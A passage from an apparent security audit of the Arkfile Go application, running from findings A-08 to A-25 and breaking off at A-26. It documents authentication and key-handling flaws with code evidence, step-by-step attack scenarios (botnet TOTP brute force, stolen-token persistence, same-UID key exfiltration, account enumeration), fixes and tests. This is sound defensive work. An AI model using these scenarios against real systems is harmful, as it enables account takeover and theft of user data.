- **Confidence:** High
- **Category:** authorization / authentication
- **Affected:**
  - `auth/totp.go:253-324` (`ValidateTOTPCode`)
  - `handlers/rate_limiting.go:374-401, 448-470, 494-543`
  - `handlers/route_config.go:84-85`

**Description.** The TOTP rate-limit is keyed on `entity_id` (HMAC of source IP), not on username. Penalty grows to 30 minutes after the 9th failure and caps there. There is no per-username failure counter, no account lockout, no security-event escalation when a single user's TOTP is being grinded.

The replay log prevents same-code-twice within a window but does nothing to bound total attempts. With `Skew = 0` (A-37), one window = 30 s = 10^6 candidates. An attacker with N source IPs gets ~3N free attempts per window. A 10,000-node botnet × 100 windows × 3 attempts = 3 million candidates — full 10^6 keyspace covered in under an hour, with no per-user alarm.

`idsrp.md` §22.2 explicitly requires "rate limit, lockout after N failures (and the lockout state must not enable account enumeration)". The lockout requirement is not met.

**Evidence.** `handlers/rate_limiting.go:500`:
```go
shareID := "auth_" + endpointType + "_" + entityID
```
Lookup key contains no username component.

**Attack scenario.**
1. Attacker has Alice's password (phishing, reuse).
2. With A-01 unfixed, attacker already has full access. Even after A-01 fixes, attacker still has a temp token and can submit TOTP guesses.
3. Attacker rotates source IPs across a botnet; each gets 3 free attempts.
4. ~10^6 keyspace covered in under an hour. Alice has no warning.

**Impact.** TOTP reduces to "the password" against a moderately resourced attacker.

**Recommendation.**
1. Add `user_totp.consecutive_totp_failures` and `last_failed_attempt` columns.
2. Increment on every failed `ValidateTOTPCode`; reset on success.
3. Lock the username after 10 consecutive failures for 15 minutes, regardless of source IP.
4. Generate a security event on lockout.
5. Document the recovery path explicitly (cross-ref A-15).
6. Make the rate-limit fail-closed (A-32).

**Suggested tests.** 10 wrong codes for `alice` from 10 different IPs; assert the 11th from yet another IP is rejected with the lock state.

---

### Finding A-09: User-wide JWT revocation not enforced per-request — 30-minute "Netflix-style" gap after admin force-logout

- **Severity:** High
- **Confidence:** High
- **Category:** authorization
- **Affected:**
  - `auth/token_revocation.go:242-286` (`TokenRevocationMiddleware`)
  - `auth/token_revocation.go:172-216` (`IsUserJWTRevoked`)
  - `handlers/auth.go:49-61, 188-228, 230-262`

**Description.** `RevokeAllUserJWTTokens` writes a `revoked_tokens` row with `token_id = "user-revoke:<user>:<ts>"`. `IsUserJWTRevoked` reads those rows and, if any is newer than the candidate JWT's `iat`, declares the JWT revoked. This is the mechanism that should make `AdminForceLogout` immediate.

`TokenRevocationMiddleware` only calls `IsRevoked(db, tokenID)` (per-JTI lookup) and **never calls `IsUserJWTRevoked`**. The check happens exactly once in the codebase: inside `RefreshToken` at `handlers/auth.go:53`. After `ForceRevokeAllTokens` or `AdminForceLogout`, the user's currently-issued JWT remains accepted for up to its TTL (30 min default) — until the client voluntarily refreshes, which an attacker holding a stolen JWT will not do.

**Evidence.** `handlers/auth.go:49-51` documents the design:
```go
// LAZY REVOCATION CHECK ... not on every API request.
// This implements the Netflix/Spotify model.
```
`handlers/auth.go:188-228` writes the user-revoke row; the middleware never consults it.

**Attack scenario.**
1. User reports lost device / stolen JWT.
2. Admin calls `/api/admin/users/<user>/force-logout`.
3. User-revoke row written.
4. Attacker continues uploading/downloading for up to 30 minutes. Only `/api/refresh` would 401 them — they will not call it.

**Impact.** Defeats user-visible "log out everywhere" / admin-force-logout guarantees. 30 minutes is plenty to exfiltrate a user's vault.

**Recommendation.**
1. Modify `TokenRevocationMiddleware` to also call `IsUserJWTRevoked(db, claims.Username, claims.IssuedAt.Time)`. One indexed query per request, in-memory cacheable.
2. Shorten the full JWT TTL to 5 minutes if you keep the lazy model. Combined: short TTL + per-request middleware check.

**Suggested tests.**
- Log in; admin force-logout; replay JWT to `/api/files`; assert 401.
- A user-revoke row dated BEFORE the JWT's `iat` must NOT revoke the JWT.

---

### Finding A-10: Refresh tokens are 122-bit UUIDv4 (not the documented 256-bit); no rotation reuse-detection; sliding-window expiry extends leaked tokens indefinitely

- **Severity:** High
- **Confidence:** High
- **Category:** cryptographic / authorization
- **Affected:**
  - `models/refresh_token.go:37` (`uuid.New().String()`)
  - `models/refresh_token.go:138-163` (sliding-window expiry; no reuse detection)
  - `auth/jwt.go:78-85` (unused 256-bit `GenerateRefreshToken()` helper)

**Description.** `auth/jwt.go:78-85` defines a `GenerateRefreshToken()` that reads 32 bytes from `crypto/rand` and base64-encodes — 256 bits. It is not used. `models.CreateRefreshToken` at line 37 uses `uuid.New().String()` — UUIDv4, which yields 122 bits per RFC 4122 §4.4 (4 bits fixed to the v4 version, 2 bits fixed to the variant).

Separately, `ValidateRefreshToken` at lines 141-163 extends `expires_at` to `now + 14d` on every successful validation (sliding window) and explicitly removes the single-use restriction (line 138). On the login path, rotation happens (`handlers/auth.go:70-81`) — so the sliding window is dead code there. But there is **no reuse detection**: if an attacker uses a stolen refresh token once and the server rotates, the legitimate user's later use fails — but the server does not invalidate the family. RFC 9700 §2.2.2 mandates this.

**Evidence.** `models/refresh_token.go:34-60`:
```go
func CreateRefreshToken(db *sql.DB, username string) (string, error) {
    tokenString := uuid.New().String()
    hash := sha256.Sum256([]byte(tokenString))
    ...
}
```
Line 138: `// Note: Removed single-use restriction - tokens can be used multiple times until expiry`.

**Attack scenario.**
1. Refresh token leaks (XSS exfil of `localStorage`, log capture, lost-device disk read).
2. Attacker uses it once. Server rotates. Attacker holds the new refresh token + fresh JWT.
3. Legitimate user's later refresh fails — they re-login. Attacker keeps rotating in parallel; session persists indefinitely.

**Impact.** Persistent stealth access; no clean revocation pathway short of admin force-logout (which has A-09's 30-min gap).

**Recommendation.**
1. Replace `uuid.New().String()` with the existing 256-bit `auth.GenerateRefreshToken()`. One-line change.
2. Add reuse detection: `ValidateRefreshToken` called with a token whose hash exists with `revoked=true` triggers:
   - `RevokeAllUserTokens(username)`.
   - `RevokeAllUserJWTTokens(username, "refresh token reuse detected")`.
   - High-severity security event log.
3. Remove the sliding-window expiry extension; use fixed 14-day TTL.

**Suggested tests.**
- Statistical: assert decoded refresh token is 32 bytes.
- Reuse: use token, then re-use the OLD token; assert (a) 401, (b) family revoked, (c) security event logged.

---

### Finding A-11: Refresh-token raw value logged to stdout when `DEBUG_MODE=true`

- **Severity:** High
- **Confidence:** High
- **Category:** privacy / logging hygiene
- **Affected:** `models/refresh_token.go:69-73` (and similar debug branches §90-127)

**Description.** `ValidateRefreshToken` prints the raw token under DEBUG_MODE:
```go
if debugMode == "true" || debugMode == "1" {
    fmt.Printf("[DEBUG] ValidateRefreshToken: token=%s, hash=%s\n", tokenString, tokenHash)
}
```
`scripts/dev-reset.sh` enables `DEBUG_MODE=true` per `AGENTS.md`. journald/podman/docker/k8s capture stdout indefinitely. Developers paste logs into bug trackers; CI archives them forever.

`AGENTS.md` and `idsrp.md` §14 both prohibit logging tokens.

**Evidence.** Cited above.

**Attack scenario.** Developer shares a log snippet from dev-reset.sh output. Snippet contains a valid refresh token. Snippet recipient calls `/api/refresh`, obtains a JWT.

**Impact.** Bearer-credential leakage. Dev/test only — but `test.arkfile.net` is in scope per AGENTS.md.

**Recommendation.** Print only the hash:
```go
fmt.Printf("[DEBUG] ValidateRefreshToken: hash=%s\n", tokenHash)
```
Grep the whole tree for `DEBUG_MODE` log statements; audit each for credential leakage.

**Suggested tests.** Enable DEBUG_MODE; capture stdout during a refresh; assert no 36-char UUID-looking string appears.

---

### Finding A-12: `models.User.Delete()` leaves refresh tokens, TOTP data, files, shares, and billing rows behind

- **Severity:** High
- **Confidence:** High
- **Category:** authorization / data hygiene
- **Affected:** `models/user.go:333-362`

**Description.** Admin user deletion cleans only `opaque_user_data` and `users`. Remaining tables retain rows that reference the deleted user:
- `refresh_tokens` rows still validate (`ValidateRefreshToken` checks only `expires_at` and `revoked`, not user existence).
- `user_totp` retains the TOTP secret + backup codes for the deleted username.
- `file_metadata` + storage objects orphan.
- `file_shares` orphan.
- `user_credits` / billing rows orphan.
- `opaque_auth_sessions` orphan.

A "deleted" user's leaked refresh token continues to work. `RequireApproved` (handlers/middleware.go:484) would 500 with `sql.ErrNoRows`, which is *effective* denial for routes behind it — but `/api/totp/status` and `/api/totp/reset` are on `auth.Echo` and may bypass `RequireApproved`. Slice E will verify per-route coverage.

**Evidence.** `models/user.go:343-355`:
```go
_, err = tx.Exec(`DELETE FROM opaque_user_data WHERE username = ?`, u.Username)
...
_, err = tx.Exec("DELETE FROM users WHERE id = ?", u.ID)
```

**Recommendation.** Cascade delete in one transaction across all referencing tables. Storage-object deletion is async (Slice C); enqueue on user delete.

**Suggested tests.** Register, set TOTP, create refresh token, upload file, share file, delete user; assert all related rows gone and storage objects queued for deletion.

---

### Finding A-13: Bootstrap token NOT consumed by first registration; second-admin race during the bootstrap window

- **Severity:** High
- **Confidence:** High
- **Category:** authorization / replay
- **Affected:**
  - `handlers/bootstrap.go:193` (explicit "DO NOT delete bootstrap token yet")
  - `handlers/auth.go:941-954` (admin-login proof-of-life deletion)

**Description.** The bootstrap token is kept alive after registration "until first admin login" — the proof-of-life pattern. Rationale: avoid lockout if the first admin can never log in. Cost: an attacker who captured the token (from stdout/journald/container logs — A-26) can register a second admin during the window where Alice has registered but not yet logged in. The localhost check (`handlers/bootstrap.go:35-39, 106-110`) is the only barrier — and it depends on `c.RealIP()` returning the originating client IP, which depends on Caddy's `X-Forwarded-For` discipline (Open Question 2).

**Evidence.** `handlers/bootstrap.go:191-194`:
```go
// 7. Cleanup Session
auth.DeleteAuthSession(database.DB, request.SessionID)
// 8. DO NOT delete bootstrap token yet - it will be deleted after first admin login (proof-of-life)
```

**Attack scenario.** Multi-admin race: Alice bootstrap-registers. Attacker captures token from logs. Attacker registers admin `mallory` using the same token. Alice's later login deletes the token, but Mallory persists.

**Impact.** Full admin compromise of a new deployment within the bootstrap window. Window size: "until first admin login" — seconds to hours depending on operator.

**Recommendation.** Consume token at registration finalize (one-shot). Pair with a separate "first-admin-login deadline": if no admin has logged in within 24 hours, an out-of-band signal (`prod-deploy.sh --reset-bootstrap`) re-enables bootstrap. Use atomic read-and-delete in a transaction.

**Suggested tests.** Bootstrap admin Alice; do NOT log Alice in; attempt to register admin Mallory with same token; assert 401/403.

---

### Finding A-14: Dev/test admin API gate has no production-environment check — env var alone is sufficient

- **Severity:** High
- **Confidence:** High
- **Category:** operational / authorization
- **Affected:** `handlers/route_config.go:234-260`

**Description.** Per `idsrp.md` §22.2 dev/test toggles must not silently disable security in non-dev builds. Arkfile gates dev-test endpoints at startup via:
```go
func isDevTestAdminAPIEnabled() bool {
    enabled := strings.ToLower(os.Getenv("ADMIN_DEV_TEST_API_ENABLED"))
    return enabled == "true" || enabled == "1" || enabled == "yes"
}
```
There is **no `utils.IsProductionEnvironment()` check**. A production deployment with `ADMIN_DEV_TEST_API_ENABLED=true` in its environment (operator error, leaked dev `.env`, broken template, supply-chain attack) exposes:
- `POST /api/admin/dev-test/users/cleanup` — admin user deletion.
- `GET /api/admin/dev-test/totp/decrypt-check/:username` — TOTP-decrypt oracle.
- `POST /api/admin/dev-test/billing/tick-now` — forces billing tick.

The TOTP-decrypt-check is particularly bad: it confirms whether a user's TOTP secret decrypts correctly under the master key, useful for validating offline guesses against the master-key derivation.

**Evidence.** Cited above.

**Recommendation.**
```go
func isDevTestAdminAPIEnabled() bool {
    if utils.IsProductionEnvironment() { return false }
    enabled := strings.ToLower(os.Getenv("ADMIN_DEV_TEST_API_ENABLED"))
    return enabled == "true" || enabled == "1" || enabled == "yes"
}
```
Stronger: `//go:build !production` tag so the routes literally do not exist in the production binary. `config/security_config.go` should fail-closed at startup if production + dev-test are both set.

**Suggested tests.** Startup test with `ARKFILE_ENV=production` and `ADMIN_DEV_TEST_API_ENABLED=true`; assert process refuses to start.

---

### Finding A-15: TOTP loss-of-device recovery is impossible — `/api/totp/reset` requires a full JWT which requires TOTP

- **Severity:** Medium (design); **High** (user-impact for any legitimate lost-device user)
- **Confidence:** High
- **Category:** design / recoverability
- **Affected:**
  - `handlers/route_config.go:78` (`auth.Echo.POST("/api/totp/reset", TOTPReset)`)
  - `handlers/auth.go:1015-1053` (`TOTPReset`)
  - `auth/totp.go:405-459` (`ResetTOTP`)

**Description.** `/api/totp/reset` is on the `auth.Echo` group — JWT-protected with `RequireTOTP` already passed. To reach it the caller needs a full JWT, which requires successful TOTP. A user who loses their authenticator and is no longer logged in cannot reach the endpoint at all.

Backup codes are intended to cover this case but `TOTPReset` consumes one *and* requires a full JWT. There is no `/api/totp/recover` endpoint that accepts username + password (via OPAQUE) + backup code as the sole credentials. There is also no admin-reset endpoint (Slice E to verify; not observed in this slice's reads).

Without a working flow, "lost authenticator + has backup codes + no live session" = lost vault. Without backup codes too, same outcome. This is partially consistent with Arkfile's no-PII / no-email policy (no recovery channel) but inconsistent with the user-visible "backup codes" feature.

**Evidence.** `handlers/route_config.go:76-78`:
```go
// TOTP Status and Reset - requires full authentication (standard JWT)
auth.Echo.GET("/api/totp/status", TOTPStatus)
auth.Echo.POST("/api/totp/reset", TOTPReset)
```
No equivalent on the temp-JWT TOTPJWTMiddleware group.

**Recommendation.** Preferred:
1. Add `/api/totp/recover` endpoint that accepts `username + fresh OPAQUE handshake + backup_code`. Validates OPAQUE proves password, marks backup code used (atomically — A-16), rotates TOTP, issues a new temp JWT for the user to verify the new TOTP secret.
2. Alternative: move `/api/totp/reset` to the temp-JWT group; the backup code is the second factor.
3. Document the lost-device path explicitly in `docs/security.md`.

**Suggested tests.** Register, set TOTP, log out, lose all sessions, attempt recovery via backup code; assert it works.

---

### Finding A-16: Backup-code race — no UNIQUE constraint on `(username, code_hash)` in `totp_backup_usage`; concurrent submissions can double-spend

- **Severity:** Medium
- **Confidence:** High
- **Category:** authorization / race condition
- **Affected:**
  - `auth/totp.go:327-379` (`ValidateBackupCode`)
  - `auth/totp.go:599-617` (`checkBackupCodeReplay`)
  - `auth/totp.go:619-626` (`logBackupCodeUsage`)
  - `database/unified_schema.sql:147-153`

**Description.** `ValidateBackupCode` does a non-locking `SELECT COUNT(*)` replay check, then linear-searches the decrypted codes, then `INSERT`s a usage row. `totp_backup_usage` has **no UNIQUE constraint** on the hash columns. Two concurrent requests with the same valid backup code both see count=0, both find the code valid, both insert, both proceed. In `TOTPAuth` this yields two parallel session pairs. In `TOTPReset` (which also calls `ValidateBackupCode`), the second rotation overwrites the first — the user thinks they have one set of new backup codes but the first set is silently dead.

The same gap exists in `totp_usage_log` but is bounded by the 30 s window, so the race window is negligible.

**Evidence.** `database/unified_schema.sql:147-153`:
```sql
CREATE TABLE IF NOT EXISTS totp_backup_usage (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    code_hash TEXT NOT NULL,
    used_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (username) REFERENCES users(username) ON DELETE CASCADE
);
```

**Attack scenario.** Attacker captures a backup code; scripts two simultaneous `POST /api/totp/auth { code: <backup>, is_backup: true }`. Both succeed.

**Impact.** Backup codes are single-use by design; this is broken.

**Recommendation.**
1. Add `UNIQUE(username, code_hash)` to `totp_backup_usage` and `UNIQUE(username, code_hash, window_start)` to `totp_usage_log`.
2. Use `INSERT ... ON CONFLICT DO NOTHING` and check `RowsAffected() == 1` as the race-free single-use signal.

**Suggested tests.** Race: spawn two goroutines submitting the same backup code; assert exactly one succeeds.

---

### Finding A-17: `totpMasterKey` is package-level `[]byte` with no `mlock`, no `MADV_DONTDUMP`, no zeroize-on-shutdown

- **Severity:** Medium
- **Confidence:** High
- **Category:** memory-safety / privacy
- **Affected:** `crypto/totp_keys.go:17-49`

**Description.** Loaded once via `sync.Once`; lives in process memory forever. No `syscall.Mlock` (page can swap to disk). No `madvise(MADV_DONTDUMP)` (page included in core dumps). No `prctl(PR_SET_DUMPABLE, 0)`. No SIGTERM/SIGINT handler that zeroes before exit. The `SecureZeroTOTPKey` helper exists (line 88-92) but is only used on *derived* per-user keys, never the master.

The agent process gets this right for its AccountKey (`cmd/arkfile-client/agent.go:368` does `syscall.Mlock`). The server's master key gets neither.

**Evidence.** `crypto/totp_keys.go:24-49`:
```go
var (
    totpMasterKey []byte
    totpOnce      sync.Once
    totpError     error
)

func InitializeTOTPMasterKey() error {
    totpOnce.Do(func() {
        ...
        totpMasterKey = key   // no mlock, no madvise
    })
    return totpError
}
```

**Attack scenario.**
1. Server segfaults / OOM-killed / crashes. Default systemd writes core to `/var/lib/systemd/coredump/`.
2. Operator with `journalctl-coredump` access (or attacker with leaked backup of that dir) extracts the 32-byte key.
3. Combined with A-07, recovers plaintext backup codes for every user.

Or: low-memory conditions swap the master-key page out. Subsequent disk leak exposes the key.

**Impact.** A normally-bounded crash dump or swap page yields cross-cutting credential material.

**Recommendation.**
1. After `km.GetOrGenerateKey` returns, call `syscall.Mlock(totpMasterKey)`. Match the agent.
2. Call `unix.Madvise(totpMasterKey, unix.MADV_DONTDUMP)`.
3. Call `prctl(PR_SET_DUMPABLE, 0)` at server startup (cross-ref Slice F systemd review).
4. Install SIGTERM/SIGINT handler that zeroes before exit.
5. Cross-apply to OPAQUE server key and JWT signing key (Slice F to verify `KeyManager`'s in-memory handling).

**Suggested tests.** Startup test under a controlled `mlock` cgroup; assert mlock succeeded (or fall-back warning is logged). In production mode, refuse to start if mlock fails.

---

### Finding A-18: TOTP master key co-located with OPAQUE / JWT / bootstrap keys in `system_keys` — single dump unlocks everything

- **Severity:** Medium (pending Open Question 1 on at-rest storage of `system_keys`)
- **Confidence:** High
- **Category:** cryptographic / design
- **Affected:** `crypto/totp_keys.go:33-34`, `database/unified_schema.sql:49-56`

**Description.** Every server-side secret routes through `KeyManager`, which writes to one `system_keys` table. JWT signing key, OPAQUE server private key, OPAQUE OPRF seed, bootstrap token, and TOTP master key are all rows in the same table. `KeyManager` presumably uses an at-rest KEK (Open Question 1 — auditor cannot read `/opt/arkfile/etc/**`).

If `system_keys` + its at-rest KEK are both retrievable in a single compromise, every server-side guarantee falls together:
- JWT key → forge any JWT.
- OPAQUE key + DB → offline-crack every password.
- TOTP master + DB → recover every TOTP secret + backup codes (A-07).
- Bootstrap token + early window → unauthorised admin.

Industry guidance: key separation. At minimum the TOTP master should live in a different storage layer (different file, different volume, HSM-backed).

**Evidence.** `crypto/totp_keys.go:33-34`:
```go
key, err := km.GetOrGenerateKey("totp_master_key_v1", "totp", 32)
```
Same call shape as `auth/keys.go:42-43` (JWT) and `auth/opaque.go:69-83` (OPAQUE).

**Recommendation.**
1. Move TOTP master key to a different on-disk location with a different at-rest mechanism (e.g., env var sourced from a separate `chmod 600` file under `/opt/arkfile/etc/totp/`).
2. Add a key-rotation procedure for the TOTP master (today: none). Mirror `scripts/maintenance/rotate-jwt-keys.sh` shape; re-derive every user's encrypted blob.
3. Update `docs/security.md` to be explicit about what "system_keys access" vs "system_keys + DB" vs "system_keys + DB + KEK" enables.

**Suggested tests.** Documented threat model; no direct unit test.

---

### Finding A-19: `decodeBase64IfNeeded` is a "rqlite driver quirk" workaround — greenfield-policy violation; brittle heuristic

- **Severity:** Medium
- **Confidence:** High
- **Category:** design / robustness
- **Affected:** `auth/totp.go:126-131, 644-653, 754-779`

**Description.** Function inspects BLOB-column bytes and *guesses* whether the rqlite driver returned them base64-encoded:
```go
// CRITICAL FIX: rqlite driver returns BLOB data as base64-encoded strings
// We need to decode them back to binary data for proper GCM decryption
```
This is exactly the "backwards-compat / driver-quirk" debt AGENTS.md instructs to flag. The right fix is at the storage layer (consistent encode/decode at write+read), not a read-time heuristic.

The heuristic is also fragile. AES-GCM ciphertext is essentially uniform-random; for a 64-byte ciphertext, the probability of accidentally being all-base64-alphabet bytes is vanishingly small in practice — but a future encryption format change (different envelope header, padding tweak) could shift the distribution. Worst case: ciphertext is mis-decoded into garbage, decrypt fails noisily, user sees "your TOTP secret is corrupted."

**Evidence.** `auth/totp.go:754-779` is the function; line 644-647 is the call-site comment.

**Recommendation.**
1. Fix the storage layer: decide once whether BLOBs are stored raw or base64-text; encode/decode explicitly. Remove `decodeBase64IfNeeded`.
2. If retained temporarily, add a property test that AES-GCM ciphertext + this heuristic round-trips identically.
3. Flag for the developer team: greenfield app, no production users — fix it properly rather than accommodate.

**Suggested tests.** Property: 1000 random AES-GCM ciphertexts; `decodeBase64IfNeeded(c)` must equal `c` (no-op on well-formed ciphertext) OR the subsequent decrypt must fail loudly with a recognisable error.

---

### Finding A-20: `CompleteTOTPSetup` does not write to the replay log — first-window code is replayable at `/api/totp/auth`

- **Severity:** Medium
- **Confidence:** High
- **Category:** authentication / replay
- **Affected:**
  - `auth/totp.go:210-250` (`CompleteTOTPSetup`)
  - `auth/totp.go:550-561` (`validateTOTPCodeInternal`)
  - `auth/totp.go:253-324` (`ValidateTOTPCode`)

**Description.** Setup completion uses `validateTOTPCodeInternal` — a code-check-only function with **no replay-log consultation or update**. The user's first valid code is therefore not recorded as "used". A subsequent call to `ValidateTOTPCode` at `/api/totp/auth` within the same 30 s window sees an empty replay log for that code and accepts it.

In the normal flow, the handler at `handlers/auth.go:790-820` issues a full JWT directly on successful `TOTPVerify` so a separate `/api/totp/auth` call is not needed. But an attacker who has the temp token AND captures the first TOTP code (phishing during enrollment) can replay at `/api/totp/auth` to spawn a parallel session.

**Evidence.** `auth/totp.go:228`:
```go
if !validateTOTPCodeInternal(secret, testCode) {
    return fmt.Errorf("invalid TOTP code")
}
```
calls the no-replay-log variant.

**Attack scenario.** Niche but real: real-time phishing of Alice's first TOTP code during enrollment.

**Recommendation.** Inside `CompleteTOTPSetup`, after the code validates, call `checkTOTPReplay` and `logTOTPUsage` as `ValidateTOTPCode` does. Or — preferred — delete `validateTOTPCodeInternal` entirely and call `ValidateTOTPCode` from `CompleteTOTPSetup`. The "internal" variant exists for one caller; the duplication is the bug.

**Suggested tests.** Enroll, verify with code X, immediately submit X to `/api/totp/auth`; assert rejection.

---

### Finding A-21: CLI agent has stat-based UID check on the socket but no `SO_PEERCRED`; same-UID processes can drain the AccountKey, poison the digest cache, or DoS-wipe

- **Severity:** Medium
- **Confidence:** High
- **Category:** authorization / IPC
- **Affected:**
  - `cmd/arkfile-client/agent.go:106-121` (`getAgentSocketPath`)
  - `cmd/arkfile-client/agent.go:138-148` (socket setup)
  - `cmd/arkfile-client/agent.go:631-654` (`validateSocketSecurity`)
  - `cmd/arkfile-client/agent.go:435-445` (session-mismatch wipe)

**Description.** The agent's threat model is "this UID owns the agent". Checks: socket parent dir 0700; socket file 0600 (chmod after `Listen`); on each connect, `os.Stat` the socket and assert UID + perms match. There is **no `SO_PEERCRED`** — the agent does not verify the connecting process's identity.

Any same-UID process can `connect(2)`. The user's typical environment includes multiple terminals, an IDE, a browser, a possible npm postinstall script. Each can:
- Call `store_digest_cache` with attacker-chosen digests → poison the dedup cache → cross-ref Slice C upload consequences.
- Read `~/.arkfile-session.json`, compute `SHA-256(access_token)`, call `get_account_key` with correct token_hash, exfiltrate the AccountKey.
- Call `get_account_key` with a wrong token_hash → triggers `wipeAllSensitiveDataLocked` → DoS-wipe the legitimate user out of their session.

`MADV_DONTDUMP` is **not called** on the AccountKey slice; `mlock` is best-effort. Core dumps include the AccountKey.

**Evidence.** `cmd/arkfile-client/agent.go:631-654` validates the socket file's stat only, not the peer. `:436-444` performs the wipe-on-mismatch with no rate-limit.

**Attack scenario.** Postinstall script in a transitive npm dep runs as the user's UID. Opens the agent socket. Reads `~/.arkfile-session.json` for the access token. Computes the right token_hash. Calls `get_account_key`. Receives the AccountKey. With the AccountKey + the user's encrypted blobs, decrypts every file.

**Impact.** AccountKey exfiltration to any same-UID process — FEK-wrapping KEK, plus the metadata key. Decrypts every file the user uploads or downloads.

**Recommendation.**
1. Implement `SO_PEERCRED` on `Accept`. Compare peer PID against an authorised list (parent PID, descendants of the same login session via cgroup membership, or PIDs whose `/proc/<pid>/exe` matches the agent's binary).
2. `madvise(MADV_DONTDUMP)` on the AccountKey slice immediately after `mlock`.
3. `prctl(PR_SET_DUMPABLE, 0)` in the agent's main.
4. Rate-limit wipe-on-mismatch: log a security event; refuse further connections from non-authorised PIDs after 3 mismatches in 60 s.
5. Reduce TTL cap from 4 hours to 1 hour.

**Suggested tests.**
- Negative: second process (same UID, different PID) attempts `get_account_key` with right token_hash; assert refusal after fix.
- Negative: malicious script triggers wipe-on-mismatch repeatedly; assert rate-limit kicks in.

---

### Finding A-22: TOTP secret, manual entry, QR data URL, and backup codes rendered as raw DOM text after enrollment — persists until navigation

- **Severity:** Medium
- **Confidence:** High
- **Category:** privacy / frontend
- **Affected:**
  - `client/static/js/src/auth/totp-setup.ts:151-180`
  - `client/static/js/src/auth/totp.ts:520-563, 279-291`

**Description.** The TOTP setup screen renders the freshly-generated secret + 10 plaintext backup codes directly into the DOM via `innerHTML`. Nodes persist:
- Until the user navigates away (full page nav clears them).
- Through any other in-page activity if the setup section is hidden via `display: none` rather than removed.

While in the DOM, any same-origin script reads them via `document.querySelectorAll('.backup-code')` or `document.getElementById('totp-reg-secret').textContent`.

The download path generates a text file; user is encouraged to save it. The clipboard handler (`navigator.clipboard.writeText(secret)`) pushes the secret to the OS clipboard — readable by every running app. The QR base64 data URL embeds the otpauth:// URL which contains the secret; any session-replay tool or accessibility checker that captures the rendered HTML captures the data URL.

**Evidence.** `totp-setup.ts:179`: `${setupData.backup_codes.map((code: string) => '<span class="backup-code">'+code+'</span>').join('')}`.

**Attack scenario.** Same-origin XSS or supply-chain script reads `.backup-code` and `#totp-reg-secret` after enrollment.

**Recommendation.**
1. Clear DOM nodes after the user confirms they have saved the codes. Replace the section's `innerHTML` with `''`.
2. Do not auto-clipboard; require an explicit user gesture, clear the clipboard after a short timeout via `navigator.clipboard.writeText('')`.
3. Display once, never re-render. If the user clicks "show codes again", refuse.
4. Tight CSP (Slice F).

**Suggested tests.** Playwright: post-"Done" click, assert `document.querySelectorAll('.backup-code').length === 0`.

---

### Finding A-23: `arkfile-client setup-totp --show-secret` prints the TOTP secret to stdout

- **Severity:** Medium
- **Confidence:** High
- **Category:** privacy / operational
- **Affected:**
  - `cmd/arkfile-client/main.go:642-647`
  - `cmd/arkfile-admin/main.go:678` (analogous admin variant)

**Description.** The `--show-secret` flag is documented as "for automation". It prints `TOTP_SECRET:<base32>` to stdout. Automation patterns then capture via `$(arkfile-client setup-totp --show-secret | grep TOTP_SECRET | cut ...)`. The secret lives in:
- Shell process heap (`SECRET=...` assignment).
- Pipeline stdin/stdout buffers.
- Shell history if interactive.
- Terminal scrollback.

Inverse of A-06 (consumed via stdin) — same secret-management failure mode, different direction.

**Evidence.** `cmd/arkfile-client/main.go:642-647`:
```go
if *showSecret {
    fmt.Printf("TOTP_SECRET:%s\n", secret)
    ...
}
```

**Recommendation.**
1. Replace `--show-secret` with `--secret-file <PATH>` (mode 0600, single-line content).
2. At minimum, write to stderr instead of stdout.
3. Document in `--help` that the secret cannot be safely passed through shell pipelines.

**Suggested tests.** Capture stdout of `setup-totp --show-secret`; assert no base32 string of length 32.

---

### Finding A-24: OPAQUE login leaks account existence by HTTP status + timing differential; admin login also enumerates admin-ness

- **Severity:** Medium
- **Confidence:** High
- **Category:** privacy / protocol correctness
- **Affected:**
  - `handlers/auth.go:466-530` (`OpaqueAuthResponse`)
  - `handlers/admin_auth.go:20-114` (`AdminOpaqueAuthResponse`)

**Description.** Non-existent username at `/api/opaque/login/response` → fast 401 after one DB miss. Existent username → CGO crypto work + DB session row + 200. Differentiable by HTTP status, body shape (presence of `session_id`, `credential_response`), and several-millisecond latency.

Admin variant is worse: `/api/admin/login/response` returns three distinguishable outcomes — 401 (no user), 403 "Administrative privileges required" (user exists, not admin), 200 (admin). Both status code and message enumerate two facts.

Per `idsrp.md` §4: "Is account enumeration possible?" — yes on both endpoints.

**Evidence.**
- `handlers/auth.go:486-494`: immediate 401 on DB miss.
- `handlers/admin_auth.go:36-56`: 401 missing, 403 non-admin.

**Attack scenario.** Targeted enumeration: is `alice` a user? is `bob` an admin? Combined with A-08, the attacker then attacks TOTP without needing to discover the username.

**Impact.** Loss of username confidentiality. For Arkfile's no-PII posture, the existence of a particular username is itself sensitive.

**Recommendation.**
1. For non-existent users on `/api/opaque/login/response`: return a deterministic fake OPAQUE response from `HMAC(username, OPRF_seed)`. Shape, status, latency all match. The fake `credential_response` will fail at finalize with the same 401 as a wrong-password attempt — converging the distinguishable outcomes.
2. For non-admin on `/api/admin/login/response`: return generic 401, no distinguishable message. Or perform the OPAQUE response anyway and reject only at finalize (one extra crypto op per non-admin attempt; rate-limit bounds the cost).
3. Extend `TimingProtectionMiddleware` to auth endpoints with a budget longer than the slowest real path.

**Suggested tests.** Fixtures: (non-existent, wrong-password, non-admin, admin); assert status, body shape, and 95th-percentile latency are statistically indistinguishable.

---

### Finding A-25: OPAQUE registration finalize leaks account existence via 409 after expensive OPAQUE work

- **Severity:** Medium
- **Confidence:** High
- **Category:** privacy / DoS
- **Affected:** `handlers/auth.go:339-444` (`OpaqueRegisterFinalize`)

**Description.** Sequence: session validation, username regex, `GetUserByUsername` (returns 409 if exists, BEFORE the expensive `StoreUserRecord`), then OPAQUE crypto. Taken username → 409 on the cheap path → enumeration. Fresh username → server pays for OPAQUE for free.

**Evidence.** `handlers/auth.go:369-374`:
```go
_, err = models.GetUserByUsername(database.DB, request.Username)
if err == nil {
    auth.DeleteAuthSession(database.DB, request.SessionID)
    return JSONError(c, http.StatusConflict, "Username already registered")
}
```

**Recommendation.** Move the collision check into `OpaqueRegisterResponse` (the first step) with the same generic error shape as any other failure. Then finalize can rely on the session being gate-kept.

**Suggested tests.** As A-24, plus: taken username during registration must return the same shape as a successful-up-to-different-failure registration.

---

### Finding A-26: Bootstrap token logged to stdout in cleartext

- **Severity:** Medium
- **Confidence:** High
- **Category:** privacy / logging hygiene
- **Affected:** `auth/bootstrap.go:67-86`

